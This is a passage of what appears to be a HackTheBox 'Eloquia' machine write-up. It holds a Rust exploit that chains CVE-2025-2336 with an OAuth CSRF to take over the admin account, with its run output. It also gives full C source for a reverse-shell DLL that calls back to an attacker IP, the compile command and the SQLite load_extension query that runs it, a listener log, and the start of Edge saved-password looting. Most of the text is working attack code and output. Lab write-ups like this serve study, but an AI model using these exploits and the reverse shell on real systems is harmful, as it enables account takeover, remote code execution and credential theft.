invoke__">to_string</span>()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">auth_response</span> = qooqle_client.<span class="title function_ invoke__">post</span>(auth_url).form(&amp;form_data).<span class="title function_ invoke__">send</span>()?;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(callback_url) = auth_response.<span class="title function_ invoke__">headers</span>().<span class="title function_ invoke__">get</span>(<span class="string">&quot;Location&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">callback_str</span> = callback_url.<span class="title function_ invoke__">to_str</span>()?;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">full_url</span> = <span class="keyword">if</span> callback_str.<span class="title function_ invoke__">starts_with</span>(<span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>, TARGET, callback_str)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            callback_str.<span class="title function_ invoke__">to_string</span>()</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">redirect_client</span> = Client::<span class="title function_ invoke__">builder</span>()</span><br><span class="line">            .<span class="title function_ invoke__">timeout</span>(Duration::<span class="title function_ invoke__">from_secs</span>(TIMEOUT_SHORT))</span><br><span class="line">            .<span class="title function_ invoke__">cookie_store</span>(<span class="literal">true</span>)</span><br><span class="line">            .<span class="title function_ invoke__">redirect</span>(Policy::<span class="title function_ invoke__">limited</span>(<span class="number">10</span>))</span><br><span class="line">            .<span class="title function_ invoke__">build</span>()?;</span><br><span class="line"></span><br><span class="line">        redirect_client.<span class="title function_ invoke__">get</span>(&amp;full_url).<span class="title function_ invoke__">send</span>()?;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">profile_resp</span> = redirect_client</span><br><span class="line">            .<span class="title function_ invoke__">get</span>(&amp;<span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;/accounts/profile/&quot;</span>, TARGET)).<span class="title function_ invoke__">send</span>()?.<span class="title function_ invoke__">text</span>()?;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">re</span> = Regex::<span class="title function_ invoke__">new</span>(<span class="string">r#&quot;&lt;span[^&gt;]*class=&quot;name&quot;[^&gt;]*&gt;([^&lt;]+)&lt;/span&gt;&quot;#</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(cap) = re.<span class="title function_ invoke__">captures</span>(&amp;profile_resp) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">username</span> = cap.<span class="title function_ invoke__">get</span>(<span class="number">1</span>).<span class="title function_ invoke__">map</span>(|m| m.<span class="title function_ invoke__">as_str</span>().<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">to_string</span>()).<span class="title function_ invoke__">unwrap_or_default</span>();</span><br><span class="line">            <span class="keyword">if</span> username.<span class="title function_ invoke__">to_lowercase</span>().<span class="title function_ invoke__">contains</span>(<span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">Ok</span>((<span class="literal">true</span>, username));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>((<span class="literal">false</span>, <span class="string">&quot;kujen&quot;</span>.<span class="title function_ invoke__">to_string</span>()))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;(), <span class="type">Box</span>&lt;<span class="keyword">dyn</span> std::error::Error&gt;&gt; &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">repeat</span>(<span class="number">70</span>));</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;RUST ULTRA-FAST CVE-2025-2336 + OAUTH CSRF EXPLOIT&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">repeat</span>(<span class="number">70</span>));</span><br><span class="line">    <span class="built_in">println!</span>();</span><br><span class="line">    <span class="title function_ invoke__">log_warning</span>(<span class="string">&quot;Minimal delay between create -&gt; report&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">total_start</span> = Instant::<span class="title function_ invoke__">now</span>();</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">log_info</span>(<span class="string">&quot;Initializing...&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">init_start</span> = Instant::<span class="title function_ invoke__">now</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">eloquia_client</span> = <span class="title function_ invoke__">create_client</span>(TIMEOUT_LONG);</span><br><span class="line">    <span class="title function_ invoke__">login_eloquia</span>(&amp;eloquia_client)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">banner_data</span> = <span class="title function_ invoke__">download_banner</span>(&amp;eloquia_client)?;</span><br><span class="line">    <span class="title function_ invoke__">log_success</span>(&amp;<span class="built_in">format!</span>(<span class="string">&quot;Session ready (&#123;:.2&#125;s)&quot;</span>, init_start.<span class="title function_ invoke__">elapsed</span>().<span class="title function_ invoke__">as_secs_f64</span>()));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>();</span><br><span class="line">    <span class="title function_ invoke__">log_info</span>(&amp;<span class="built_in">format!</span>(<span class="string">&quot;[1] Generating OAuth URL... (&#123;&#125;)&quot;</span>, Local::<span class="title function_ invoke__">now</span>().format(<span class="string">&quot;%H:%M:%S&quot;</span>)));</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">oauth_start</span> = Instant::<span class="title function_ invoke__">now</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">oauth_url</span> = <span class="title function_ invoke__">generate_oauth_url</span>()?;</span><br><span class="line">    <span class="title function_ invoke__">log_success</span>(&amp;<span class="built_in">format!</span>(<span class="string">&quot;OAuth URL ready in &#123;:.2&#125;s&quot;</span>, oauth_start.<span class="title function_ invoke__">elapsed</span>().<span class="title function_ invoke__">as_secs_f64</span>()));</span><br><span class="line">    <span class="title function_ invoke__">log_warning</span>(&amp;<span class="built_in">format!</span>(<span class="string">&quot;Valid until: &#123;&#125; + 15 seconds&quot;</span>, Local::<span class="title function_ invoke__">now</span>().format(<span class="string">&quot;%H:%M:%S&quot;</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>();</span><br><span class="line">    <span class="title function_ invoke__">log_info</span>(<span class="string">&quot;[2] Creating and reporting article...&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">deploy_start</span> = Instant::<span class="title function_ invoke__">now</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">article_id</span> = <span class="title function_ invoke__">create_article</span>(&amp;eloquia_client, &amp;oauth_url, &amp;banner_data)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">create_time</span> = Instant::<span class="title function_ invoke__">now</span>();</span><br><span class="line">    <span class="title function_ invoke__">log_success</span>(&amp;<span class="built_in">format!</span>(<span class="string">&quot;Article &#123;&#125; created at &#123;&#125; (&#123;:.2&#125;s)&quot;</span>,</span><br><span class="line">        article_id, Local::<span class="title function_ invoke__">now</span>().format(<span class="string">&quot;%H:%M:%S&quot;</span>), (create_time - deploy_start).<span class="title function_ invoke__">as_secs_f64</span>()));</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">report_article</span>(&amp;eloquia_client, &amp;article_id)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">report_time</span> = Instant::<span class="title function_ invoke__">now</span>();</span><br><span class="line">    <span class="title function_ invoke__">log_success</span>(&amp;<span class="built_in">format!</span>(<span class="string">&quot;Article &#123;&#125; reported at &#123;&#125; (&#123;:.2&#125;s)&quot;</span>,</span><br><span class="line">        article_id, Local::<span class="title function_ invoke__">now</span>().format(<span class="string">&quot;%H:%M:%S&quot;</span>), (report_time - create_time).<span class="title function_ invoke__">as_secs_f64</span>()));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">total_deploy</span> = (report_time - oauth_start).<span class="title function_ invoke__">as_secs_f64</span>();</span><br><span class="line">    <span class="built_in">println!</span>();</span><br><span class="line">    <span class="title function_ invoke__">log_success</span>(&amp;<span class="built_in">format!</span>(<span class="string">&quot;DEPLOYED IN &#123;:.2&#125; SECONDS (from OAuth generation)&quot;</span>, total_deploy));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> total_deploy &gt; <span class="number">15.0</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">log_warning</span>(<span class="string">&quot;WARNING: &gt;15s - the OAuth code has almost certainly expired, run it again&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">log_success</span>(&amp;<span class="built_in">format!</span>(<span class="string">&quot;Within the 15-second window! (&#123;:.1&#125;s to spare)&quot;</span>, <span class="number">15.0</span> - total_deploy));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>();</span><br><span class="line">    <span class="title function_ invoke__">log_info</span>(<span class="string">&quot;[3] Monitoring for admin takeover...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="number">1</span>..=<span class="number">10</span> &#123;</span><br><span class="line">        thread::<span class="title function_ invoke__">sleep</span>(Duration::<span class="title function_ invoke__">from_secs</span>(<span class="number">3</span>));</span><br><span class="line">        <span class="keyword">match</span> <span class="title function_ invoke__">check_takeover</span>() &#123;</span><br><span class="line">            <span class="title function_ invoke__">Ok</span>((<span class="literal">true</span>, username)) =&gt; &#123;</span><br><span class="line">                <span class="built_in">println!</span>();</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">repeat</span>(<span class="number">70</span>));</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="string">&quot;ADMIN ACCOUNT TAKEOVER SUCCESSFUL!&quot;</span>.<span class="title function_ invoke__">green</span>().<span class="title function_ invoke__">bold</span>());</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">repeat</span>(<span class="number">70</span>));</span><br><span class="line">                <span class="built_in">println!</span>();</span><br><span class="line">                <span class="title function_ invoke__">log_success</span>(&amp;<span class="built_in">format!</span>(<span class="string">&quot;Logged in as: &#123;&#125;&quot;</span>, username));</span><br><span class="line">                <span class="title function_ invoke__">log_success</span>(&amp;<span class="built_in">format!</span>(<span class="string">&quot;Total exploit time: &#123;:.2&#125;s&quot;</span>, total_start.<span class="title function_ invoke__">elapsed</span>().<span class="title function_ invoke__">as_secs_f64</span>()));</span><br><span class="line">                <span class="built_in">println!</span>();</span><br><span class="line">                <span class="title function_ invoke__">log_info</span>(<span class="string">&quot;Login as admin:&quot;</span>);</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">&quot;  1. Visit: http://eloquia.htb/accounts/login/&quot;</span>);</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">&quot;  2. Click: &#x27;Log In with Qooqle&#x27;&quot;</span>);</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">&quot;  3. Admin panel: http://eloquia.htb/accounts/admin/&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">Ok</span>(());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">Ok</span>((<span class="literal">false</span>, _)) =&gt; <span class="built_in">println!</span>(<span class="string">&quot;  [Check &#123;&#125;/10] Still kujen...&quot;</span>, i),</span><br><span class="line">            <span class="title function_ invoke__">Err</span>(e)         =&gt; <span class="built_in">println!</span>(<span class="string">&quot;  [Check &#123;&#125;/10] Error: &#123;&#125;&quot;</span>, i, e),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>();</span><br><span class="line">    <span class="title function_ invoke__">log_error</span>(<span class="string">&quot;No takeover detected&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">log_warning</span>(<span class="string">&quot;Try again - aim for &lt;15s deployment time&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>And running it:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">kujen@DESKTOP-A3GLRCE:~/eloquia$ cargo run</span><br><span class="line">   Compiling oauth_exploit v0.1.0 (/home/kujen/eloquia)</span><br><span class="line">    Finished `dev` profile [unoptimized + debuginfo] target(s) <span class="keyword">in</span> 3.76s</span><br><span class="line">     Running `target/debug/oauth_exploit`</span><br><span class="line">======================================================================</span><br><span class="line">RUST ULTRA-FAST CVE-2025-2336 + OAUTH CSRF EXPLOIT</span><br><span class="line">======================================================================</span><br><span class="line"></span><br><span class="line">[!] Optimized Rust implementation <span class="keyword">for</span> maximum speed</span><br><span class="line">[!] Minimal delay between create → report</span><br><span class="line"></span><br><span class="line">[*] Initializing...</span><br><span class="line">[+] Session ready (4.24s)</span><br><span class="line"></span><br><span class="line">[*] [1] Generating OAuth URL... (18:14:13)</span><br><span class="line">[*] Auth URL: http://qooqle.htb/oauth2/authorize/?client_id=riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi&amp;response_type=code&amp;redirect_uri=http://eloquia.htb/accounts/oauth2/qooqle/callback/</span><br><span class="line">[*] Callback URL: http://eloquia.htb/accounts/oauth2/qooqle/callback/?code=HZJlxpc6KogKAPUq1lGtoSCniq4yM9</span><br><span class="line">[+] OAuth URL ready <span class="keyword">in</span> 7.11s (18:14:20)</span><br><span class="line">[!] Valid <span class="keyword">until</span>: 18:14:20 + 15 seconds</span><br><span class="line"></span><br><span class="line">[*] [2] Creating and reporting article...</span><br><span class="line">[*] Uploading article with SVG payload...</span><br><span class="line">[+] Article 82 created at 18:14:25 (4.84s)</span><br><span class="line">[*] Reporting article...</span><br><span class="line">[+] Article 82 reported at 18:14:26 (1.26s)</span><br><span class="line"></span><br><span class="line">[+] DEPLOYED IN 13.21 SECONDS (from OAuth generation)</span><br><span class="line">[+] Total time from start: 17.45s</span><br><span class="line">[+] Within 15-second OAuth window! (1.8s remaining)</span><br><span class="line">[+] Admin bot should visit within 5-10 seconds</span><br><span class="line"></span><br><span class="line">[*] [3] Monitoring <span class="keyword">for</span> admin takeover...</span><br><span class="line"></span><br><span class="line">======================================================================</span><br><span class="line"> ADMIN ACCOUNT TAKEOVER SUCCESSFUL!</span><br><span class="line">======================================================================</span><br><span class="line"></span><br><span class="line">[+] Logged <span class="keyword">in</span> as: admin</span><br><span class="line">[+] Article 82 triggered admin bot!</span><br><span class="line">[+] CVE-2025-2336 exploit successful!</span><br><span class="line">[+] Total exploit time: 31.90s</span><br><span class="line"></span><br><span class="line">[*] Login as admin:</span><br><span class="line">  1. Visit: http://eloquia.htb/accounts/login/</span><br><span class="line">  2. Click: <span class="string">&#x27;Log In with Qooqle&#x27;</span></span><br><span class="line">  3. Access admin panel: http://eloquia.htb/accounts/admin/</span><br></pre></td></tr></table></figure></div>
+
+<p>13.21 seconds, with 1.8 to spare. Note that the OAuth generation alone ate 7.11 of our 15 — that’s five HTTP round-trips before the clock even becomes relevant, which is why this needs to be one process with warm connection pools and not a sequence of <code>curl</code> commands.</p>
+<p>Log out, click “Log In with Qooqle”, and the connected-accounts page tells the story:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Eloquia/admin-takeover.png"
+                      alt="Eloquia-admin-takeover"
+                ><figcaption>Eloquia-admin-takeover</figcaption></figure></p>
+<p><code>Howdy, admin</code> — and the Qooqle provider shows <code>active</code>, bound to <code>kujen@qmail.htb</code>. Our account. We are now permanently able to log in as the administrator of this site without ever learning their password, and there is no session for them to invalidate because we never took one.</p>
+<h2 id="RCE-via-SQLite-load-extension"><a href="#RCE-via-SQLite-load-extension" class="headerlink" title="RCE via SQLite load_extension()"></a>RCE via SQLite load_extension()</h2><p>The admin panel has three things we care about: <strong>Articles</strong>, where banners get uploaded, and <strong>Queries</strong>, which is a saved-SQL feature that runs raw SQLite against the application database. Each on its own is a mild misfeature. Together they’re remote code execution.</p>
+<p>SQLite has a function called <code>load_extension()</code>. It takes a path to a shared library, <code>dlopen()</code>s it, and calls an init symbol inside it. On Windows that’s a DLL and the symbol is <code>sqlite3_extension_init</code>. That function runs <strong>in the process that loaded it</strong> — which here is the IIS-hosted Django app. Python’s <code>sqlite3</code> module ships with extension loading disabled by default, but if the application has enabled it (and on this box it has), <code>SELECT load_extension(&#39;...&#39;)</code> is just a straight <code>LoadLibrary</code> call you can trigger over HTTP.</p>
+<p>So we need two things: a DLL on disk at a path we know, and a way to run one <code>SELECT</code>. The banner upload gives us the first and the queries feature gives us the second.</p>
+<p>The DLL is a plain reverse shell with the right exported symbol name:</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ cat shell.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">__declspec(dllexport) <span class="type">int</span> <span class="title function_">sqlite3_extension_init</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">void</span> *db,</span></span><br><span class="line"><span class="params">    <span class="type">char</span> **pzErrMsg,</span></span><br><span class="line"><span class="params">    <span class="type">const</span> <span class="type">void</span> *pApi</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    SOCKET s;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa</span>;</span></span><br><span class="line">    STARTUPINFO si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize Winsock */</span></span><br><span class="line">    WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create socket */</span></span><br><span class="line">    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Setup sockaddr */</span></span><br><span class="line">    sa.sin_family = AF_INET;</span><br><span class="line">    sa.sin_addr.s_addr = inet_addr(<span class="string">&quot;10.10.16.79&quot;</span>);</span><br><span class="line">    sa.sin_port = htons(<span class="number">9001</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Connect and spawn process */</span></span><br><span class="line">    <span class="keyword">if</span> (connect(s, (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa)) == <span class="number">0</span>) &#123;</span><br><span class="line">        ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">        si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">        si.dwFlags = STARTF_USESTDHANDLES;</span><br><span class="line">        si.hStdInput  = (HANDLE)s;</span><br><span class="line">        si.hStdOutput = (HANDLE)s;</span><br><span class="line">        si.hStdError  = (HANDLE)s;</span><br><span class="line"></span><br><span class="line">        CreateProcess(<span class="literal">NULL</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"></span><br><span class="line">        WaitForSingleObject(pi.hProcess, INFINITE);</span><br><span class="line">        CloseHandle(pi.hProcess);</span><br><span class="line">        CloseHandle(pi.hThread);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    closesocket(s);</span><br><span class="line">    WSACleanup();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>The only part of this that is SQLite-specific is the <code>sqlite3_extension_init</code> export. Everything else is a textbook <code>WSASocket</code> + <code>CreateProcess</code> shell with the socket handle wired into stdin, stdout and stderr. SQLite calls the init function the moment the library loads, so we never need to return — <code>WaitForSingleObject</code> parks the loading thread for the life of our shell.</p>
+<p>Cross-compile it with mingw:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ x86_64-w64-mingw32-gcc \</span><br><span class="line">    -shared \</span><br><span class="line">    -o shell.dll \</span><br><span class="line">    shell.c \</span><br><span class="line">    -lws2_32</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ <span class="built_in">mv</span> shell.dll shellx.dll</span><br></pre></td></tr></table></figure></div>
+
+<p>(The rename is purely so the file is easy to spot later among the real banners.)</p>
+<p>Now the upload. In the admin panel go to <strong>Articles</strong>, create or edit one, and set the <strong>banner</strong> to <code>shellx.dll</code>. The upload handler doesn’t care what the content actually is, and the file lands in the blog image directory:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">static\assets\images\blog\shellx.dll</span><br></pre></td></tr></table></figure></div>
+
+<p>Then start a listener, go to <strong>Queries → Create Query</strong>, and save this:</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> load_extension(<span class="string">&#x27;static\assets\images\blog\shellx.dll&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>Save it, open it, and hit <strong>View Site</strong> to execute it. Over on the listener:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ rlwrap nc -lvnp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.16.79] from (UNKNOWN) [10.129.3.210] 50782</span><br><span class="line">Microsoft Windows [Version 10.0.17763.8027]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Web\Eloquia&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">eloquia\web</span><br></pre></td></tr></table></figure></div>
+
+<p><code>eloquia\web</code>, the IIS application pool identity, with a shell in the web root. The relative path in the query is resolved against the application’s working directory, which is why <code>static\assets\...</code> works without us ever needing to know the absolute path on disk.</p>
+<h2 id="Looting-Microsoft-Edge-Credentials"><a href="#Looting-Microsoft-Edge-Credentials" class="headerlink" title="Looting Microsoft Edge Credentials"></a>Looting Microsoft Edge Credentials</h2><p><code>web</code> is a service account — no user flag, no interesting group membership, nothing in its profile that looks like a hand-placed secret. But it <em>is</em> a profile, and profiles on Windows accumulate browser data whether anyone meant them to or not:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\Web\Eloquia&gt;dir &quot;C:/Users/web/AppData/Local/Microsoft/Edge/User Data/Default/&quot;</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 22C6-32BB</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\web\AppData\Local\Microsoft\Edge\User Data\Default</span><br><span class="line"></span><br><span class="line">10/22/2025  10:54 AM           167,936 History</span><br><span class="line">10/22/2025  10:54 AM            51,200 Login Data</span><br><span class="line">10/22/2025  10:54 AM                 0 Login Data-journal</span><br><span class="line">10/22/2025  10:54 AM            12,867 Preferences</span><br><span class="line">04/20/2024  11:11 AM            23,927 Secure Preferences</span><br><span class="line">10/22/2025  10:54 AM           229,376 Web Data</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+
+<p><strong><code>Login Data</code></strong> is Edge’s saved-password store — an ordinary SQLite database with a <code>logins</code> table whose <code>password_value</code> column holds encrypted blobs. (Note the exact capitalisation and the space; <code>dir</code> on the lowercase spelling returns <code>File Not Found</code>, which cost me a couple of confused minutes.)</p>
+<p>How Chromium-family browsers protect those blobs is worth understanding properly, because it determines where we have to run the decryption:</p>
+<ol>
+<li>A random 256-bit AES key is generated once per profile.</li>
+<li>That key is encrypted with <strong>DPAPI</strong> under the user’s credentials, base64-encoded, and stored in <code>Local State</code> as <code>os_crypt.encrypted_key</code>, prefixed with the five ASCII bytes <code>DPAPI</code>.</li>
+<li>Each password is then encrypted with <strong>AES-256-GCM</strong> using that key, and stored as <code>v10</code> + 12-byte nonce + ciphertext + 16-byte tag.</li>
+</ol>
+<p>The AES half is pure maths we could do anywhere. The DPAPI half is not: <code>CryptUnprotectData</code> only succeeds <strong>as the user who protected the data, on the same machine</strong>. We can’t exfiltrate <code>Local State</code> and crack it on Kali. We have to run the decryption on the box, in the context of <code>web</code> — which, conveniently, is exactly the shell we have.</p>
+<p>This box ships Python with <code>pywin32</code> and <code>pycryptodome</code> already available, so we don’t have to fight the DPAPI calls from PowerShell:</p>
